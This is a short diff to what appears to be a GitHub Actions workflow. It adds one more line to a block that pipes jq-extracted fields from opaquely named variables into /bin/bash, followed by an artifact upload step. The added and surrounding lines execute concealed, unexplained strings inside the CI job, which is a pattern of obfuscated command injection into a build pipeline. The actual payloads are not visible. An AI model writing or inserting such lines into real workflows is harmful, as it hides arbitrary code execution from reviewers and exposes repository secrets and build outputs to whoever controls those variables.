@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$tx483" | jq -r .oxr14 | /bin/bash
           printf '%s' "$larqv16647" | jq -r .b847 | /bin/bash
           echo $v728 | jq -r .tb95 | /bin/bash
+          printf '%s' "$a0" | jq -r .hilqw2 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
